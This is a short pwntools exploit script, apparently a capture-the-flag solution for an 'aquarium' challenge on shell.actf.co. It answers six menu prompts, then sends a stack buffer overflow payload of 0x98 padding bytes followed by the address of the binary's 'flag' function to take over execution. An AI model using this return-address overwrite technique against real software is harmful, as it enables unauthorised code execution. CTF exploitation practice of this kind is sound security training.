from pwn import *
r=remote('shell.actf.co',19305)
#r=process("./aquarium")
context.log_level='debug'
b=ELF("./aquarium")

pay=""
pay+='x'*0x98
pay+=p64(b.symbols['flag'])

r.sendline('1')
r.sendline('1')

r.sendline('1')

r.sendline('1')

r.sendline('1')

r.sendline('1')

r.sendline(pay)

r.interactive()

